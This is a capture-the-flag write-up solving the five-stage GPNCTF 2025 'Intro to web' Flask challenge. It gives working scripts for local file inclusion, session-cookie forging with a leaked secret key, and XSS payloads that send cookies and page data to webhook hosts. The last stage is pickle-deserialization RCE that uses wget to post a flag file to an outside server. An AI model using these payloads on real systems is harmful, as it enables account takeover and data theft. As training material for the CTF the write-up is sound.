# Intro to web

## Part 1 

### Description

5 vulns, 5 stages - can you find them all?

Files: [intro-web-1.tar.gz](https://gpn23.ctf.kitctf.de/challenges/handout/intro-web-1)

Author: **finn, vurlo**

### Solution

![Intro to web.png](/assets/ctf/gpnctf/2025/web/Intro to web.png)

It says password is optional? After trying lots of usernames basically username can be anything you want.

![Intro to web-1.png](/assets/ctf/gpnctf/2025/web/Intro to web-1.png)

We can create new notes, but doesn't seem useful.

![Intro to web-2.png](/assets/ctf/gpnctf/2025/web/Intro to web-2.png)

Cookies are not JWT, but Flask Cookies
```bash
└─$ flask-unsign -c '.eJyrViotTi1SsqpWKsrPSVWygnB1wFReYi5IJDElNzNPqbYWAECoDrg.aFU6Ug.y8snKINH-NeVQueb3Ku5nJVcT-U' -d
{'user': {'role': 'user', 'username': 'admin'}}
```

The STAGE_1 flag is stored inside the `.env` file, hence we need LFI to get started.

![Intro to web-3.png](/assets/ctf/gpnctf/2025/web/Intro to web-3.png)

`main.py` implements custom jinja filters which are used in the templates.

![Intro to web-4.png](/assets/ctf/gpnctf/2025/web/Intro to web-4.png)

`image_path` is controlled by the user, meaning it's injectable.
```python
@app.route('/note/new', methods=['GET', 'POST'])
@login_required
def new_note():
    if request.method == 'POST':
        title = request.form['title']
        content = request.form['content']
        image_path = request.form['image_path']

        note_id = str(uuid4())
        notes[note_id] = {'owner': g.user, 'title': title, 'content': content, 'image_path': image_path}

        flash('Note created', 'success')
        return redirect(url_for('view_note', note_id=note_id))

    return render_template('note_form.html', image_path=random.choice(['.img/1.png', '.img/2.png', '.img/3.png']),)
```

`lfi.py`:
```python
from requests import Session
from bs4 import BeautifulSoup as BS
from base64 import b64decode as bd

URL = 'https://springville-of-nuclear-grade-stars.gpn23.ctf.kitctf.de'

with Session() as session:
    session.post(URL + '/login', data={'username': 'admin', 'password': 'admin'})

    while True:
        lfi = input('LFI: ')
        resp = session.post(URL + '/note/new', data={'title': 'a', 'content': 'b', 'image_path': lfi})
        src = BS(resp.text, 'html.parser').find('img')['src']
        data = src.split(',', 1)[1].strip()
        if data:
            data = bd(data).decode()
            print(data)
        else:
            print('No data found for this LFI path. ' + lfi)
        print('---')
```

```powershell
➜ py .\lfi.py
LFI: .img/../.env
FLASK_APP_SECRET_KEY=ab52f79ba61a6d7523245a53349f512c061f4008f0f857c54374a6bd08e53efff4b89fd8ffcdfb4c558f8fe3e7d320e3fe4a
FLAG_STAGE_1=GPNCTF{jU57_13ak_All_the_th1Ngs}
```

## Part 2 

### Solution

For part 2 the bot logs in as random user and creates note with flag.

![Intro to web-5.png](/assets/ctf/gpnctf/2025/web/Intro to web-5.png)

We are not able to leak the `/proc/environ` as it's outside `wwwroot`.

The `/report/<note_id>` route is able to interact with the bot, this is our entrypoint.

![Intro to web-6.png](/assets/ctf/gpnctf/2025/web/Intro to web-6.png)

First we need to be able to Report the notes, this requires **admin** or **moderator** access.

To become admin we just have to have one of the following roles.
```python
def is_mod():
    return g.user.get('role') in ['admin', 'moderator']
```

Since we leaked `.env` it's possible to forge custom cookies:
```bash
└─$ flask-unsign -c '.eJyrViotTi1SsqpWKsrPSVWygnB1wFReYi5IJDElNzNPqbYWAECoDrg.aFU6Ug.y8snKINH-NeVQueb3Ku5nJVcT-U' -d
{'user': {'role': 'user', 'username': 'admin'}}

└─$ flask-unsign -s -c "{'user': {'role': 'admin', 'username': 'admin'}}" -S 'ab52f79ba61a6d7523245a53349f512c061f4008f0f857c54374a6bd08e53efff4b89fd8ffcdfb4c558f8fe3e7d320e3fe4a'
.eJyrViotTi1SsqpWKsrPSVWyUkpMyc3MU9IBC-cl5iKEamsBTh0PAg.aFVD-g.jxv9ow2II4PqUNfoKf6ozPk0WHI
```

![Intro to web-7.png](/assets/ctf/gpnctf/2025/web/Intro to web-7.png)

`templates/report_note.html` contains following lines:
```html
{# The reason is safe, why else would we allow it to be reported? #}
<p>Report reason: {{ note.reason|safe }}</p>
```

TL;DR on `safe` filter is that it's going to render whatever HTML we pass.

```python
from requests import Session
from bs4 import BeautifulSoup as BS
from base64 import b64decode as bd
from flask_unsign import decode, sign
import re

URL = 'https://silverridge-of-mega-ultra-unity.gpn23.ctf.kitctf.de'

with Session() as session:
    ## Debug
    # session.proxies = {
    #     'http':  'http://127.0.0.1:8080',
    #     'https': 'http://127.0.0.1:8080'
    # }
    # session.verify = False
    
    session.post(f'{URL}/login', data={'username': 'admin', 'password': 'admin'})
    resp = session.post(f'{URL}/note/new', data={'title': 'a', 'content': 'b', 'image_path': '.img/../.env'})
    src = BS(resp.text, 'html.parser').find('img')['src'].split(',', 1)[1].strip()
    secret_key = bd(src).decode().split('\n')[0].split('=')[1]
    note_id = resp.url.split('/')[-1]
    print(f'Note ID: {note_id}')
    print(f'Secret Key: {secret_key}')

    cookie = decode(session.cookies['session'])
    print(f'Cookie: {cookie}')
    cookie['user']['role'] = 'admin'
    cookie = sign(cookie, secret_key)
    session.cookies.clear()
    session.cookies.set('session', cookie)
    print(f'Signed Cookie: {cookie}')
    
    payload = "<script>fetch('https://uwuos.free.beeceptor.com/?c='.concat(document.cookie))</script>"
    session.post(f'{URL}/report/{note_id}', data={'reason': payload})
    print('Payload sent! Check webhook for the cookie.')
    
    resp = session.get(f'{URL}/dashboard')
    flag = re.search(r'GPNCTF\{[^\}]+\}', resp.text).group()
    print(f'Flag: {flag}') 
```

```bash
Note ID: 4988f0f2-1011-4ca0-a6e7-1fcd627d46a1
Secret Key: aa46263ec7797dbbe44a335eedcf301af983368decc21bc835e5f4647edb4aa286127b63a100a9ac8e74da75ef90cfad8537
Cookie: {'user': {'role': 'user', 'username': 'admin'}}
Signed Cookie: .eJyrViotTi1SsqpWKsrPSVWyUkpMyc3MU9IBC-cl5iKEamsBTh0PAg.aFVOsg.uu2nUMKbcG3-A6FfMLbweAuypaU
Payload sent! Check webhook for the cookie.
Flag: GPNCTF{forg3_d15_JU1Cy_mOD}
```

> Flag: `GPNCTF{forg3_d15_JU1Cy_mOD}`

## Part 3

### Solution

Just rerun the above script with 3rd challenge domain and check your webhook for flag.

![Intro to web-8.png](/assets/ctf/gpnctf/2025/web/Intro to web-8.png)

> Flag: `GPNCTF{i_1oVe_s7olen_cooKI3s}`

## Part 4

### Solution

Part 4 is available on `/development` route, but we need to be
1. Logged in
2. Admin
3. Have access to development routes
```python
@app.route('/development', methods=['GET'])
@login_required
@moderator_required
@development_routes_required
def development():
    return FLAG_STAGE_4, 200

def development_routes_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not SHOW_DEVELOPMENT_ROUTES:
            return 'Development routes are not enabled', 403
        return f(*args, **kwargs)

    return decorated
    
@app.route('/settings', methods=['POST'])
@login_required
@admin_required
def settings():
    show_dev_routes = request.json.get('show_development_routes', False)

    global SHOW_DEVELOPMENT_ROUTES
    SHOW_DEVELOPMENT_ROUTES = show_dev_routes

    flash('Settings updated', 'success')
    return "Settings updated", 200
```

By default the dev is turned off, but with admin access we can turn it back on.

Admin access might not be so simple...
```python
ADMIN_PASSWORD_HASH = os.environ.get('ADMIN_PASSWORD_HASH')

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        # I only trust my self to know the admin password :)
        if not hashlib.sha512(request.cookies.get('ADMIN_PASSWORD').encode()).hexdigest() == ADMIN_PASSWORD_HASH:
            return 'Unauthorized - You must be a admin to access this page', 403
        return f(*args, **kwargs)

    return decorated
```

Ugh.... The reason we didn't see `ADMIN_PASSWORD` in XSS is because of `httpOnly` switch.
```js
await browser.setCookie({
	domain: baseUrl.replace('http://', '').replace('https://', ''),
	name: 'ADMIN_PASSWORD',
	value: password,
	httpOnly: true,
})
```

On the other hand, do we really need the password? The bot can do the hard work for us since it has the password.

```python
from requests import Session
from bs4 import BeautifulSoup as BS
from base64 import b64decode as bd
from flask_unsign import decode, sign

URL = 'https://grandforge-of-cosmically-harmony.gpn23.ctf.kitctf.de'

with Session() as session:
    ## Debug
    # session.proxies = {
    #     'http':  'http://127.0.0.1:8080',
    #     'https': 'http://127.0.0.1:8080'
    # }
    # session.verify = False
    
    session.post(f'{URL}/login', data={'username': 'admin', 'password': 'admin'})
    resp = session.post(f'{URL}/note/new', data={'title': 'a', 'content': 'b', 'image_path': '.img/../.env'})
    src = BS(resp.text, 'html.parser').find('img')['src'].split(',', 1)[1].strip()
    secret_key = bd(src).decode().split('\n')[0].split('=')[1]
    note_id = resp.url.split('/')[-1]
    print(f'Note ID: {note_id}')
    print(f'Secret Key: {secret_key}')

    cookie = decode(session.cookies['session'])
    print(f'Cookie: {cookie}')
    cookie['user']['role'] = 'admin'
    cookie = sign(cookie, secret_key)
    session.cookies.clear()
    session.cookies.set('session', cookie)
    print(f'Signed Cookie: {cookie}')
    
    payload = """
    <script>
    fetch('/settings', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ show_development_routes: true })
    });

    fetch('/development')
        .then(response => response.text())
        .then(data => {
            fetch('https://webhook.site/7279e6f8-3962-4b6a-8208-4fad54720b3d/?c=' + encodeURIComponent(data));
        });
    </script>
    """
    session.post(f'{URL}/report/{note_id}', data={'reason': payload})
    print('Payload sent!')
```

![Intro to web-9.png](/assets/ctf/gpnctf/2025/web/Intro to web-9.png)

## Part 5

### Solution

The `setup.py` writes last file to god knows where, LFI bruteforce will take decades hence we require RCE.
```python
with open(f"flag_{uuid4().hex + uuid4().hex + uuid4().hex}.txt", "w") as f:
    f.write(FLAG_STAGE_5)
```

Glancing over the leftover code we see `pickle` module used with user input -> [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
```python
@app.route('/development/cookie-sign', methods=['POST'])
@login_required
@moderator_required
@development_routes_required
def sign_cookie():
    """Development route to learn how signing cookies works."""
    value = request.data.decode('utf-8')
    secret_key = app.secret_key.encode()
    signature = hashlib.sha256((value + secret_key.decode()).encode()).hexdigest()

    data = pickle.dumps({'value': value, 'signature': signature, }, 0)

    return {'cookie': f"{base64.b64encode(data).decode("utf-8")}"}, 200


@app.route('/development/cookie-verify', methods=['POST'])
@login_required
@moderator_required
@development_routes_required
def verify_cookie():
    """Development route to validat the signature of the cookie is valid."""
    data = request.json.get('cookie')
    try: data = pickle.loads(base64.b64decode(data))
    except: return "Invalid data :/", 400

    value = data.get('value')
    signature = data.get('signature')

    if not value or not signature: return "Missing signature or value", 400

    secret_key = app.secret_key.encode()
    expected_signature = hashlib.sha256((value + secret_key.decode()).encode()).hexdigest()

    if expected_signature != signature: return "Invalid signature", 400

    return "Valid Cookie!", 200
```

This was kind of painful to make it work, `curl` didn't exist or `bash`. Had to go into the container to discover this... `wget` exists
```python
import os
from requests import Session
from bs4 import BeautifulSoup as BS
from base64 import b64decode as bd, b64encode
from flask_unsign import decode, sign
import pickle

URL = 'https://lakefield-of-apocalyptic-power.gpn23.ctf.kitctf.de'
# URL = 'http://127.0.0.1:9222'

class LetMeIn:
    def __reduce__(self):
        return (os.system,("wget --post-file=$(ls -1 /app/flag*) https://webhook.site/7279e6f8-3962-4b6a-8208-4fad54720b3d/?letmein -O-",))

with Session() as session:
    ## Debug
    # session.proxies = {
    #     'http':  'http://127.0.0.1:8080',
    #     'https': 'http://127.0.0.1:8080'
    # }
    # session.verify = False
    
    session.post(f'{URL}/login', data={'username': 'admin', 'password': 'admin'})
    resp = session.post(f'{URL}/note/new', data={'title': 'a', 'content': 'b', 'image_path': '.img/../.env'})
    src = BS(resp.text, 'html.parser').find('img')['src'].split(',', 1)[1].strip()
    secret_key = bd(src).decode().split('\n')[0].split('=')[1]
    note_id = resp.url.split('/')[-1]
    print(f'Note ID: {note_id}')
    print(f'Secret Key: {secret_key}')

    cookie = decode(session.cookies['session'])
    print(f'Cookie: {cookie}')
    cookie['user']['role'] = 'admin'
    cookie = sign(cookie, secret_key)
    session.cookies.clear()
    session.cookies.set('session', cookie)
    print(f'Signed Cookie: {cookie}')
    
    payload = """
    <script>
    fetch('/settings', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ show_development_routes: true })
    });
    """
    session.post(f'{URL}/report/{note_id}', data={'reason': payload})
    print('Payload sent!')

    rce_payload = b64encode(pickle.dumps(LetMeIn())).decode()
    print(f"RCE payload: {rce_payload}")
    resp = session.post(f'{URL}/development/cookie-verify', json={'cookie': rce_payload})
    print(resp.text)
```

![Intro to web-11.png](/assets/ctf/gpnctf/2025/web/Intro to web-11.png)

> Flag: `GPNCTF{rcE_is_EV3RYtH1nG}`

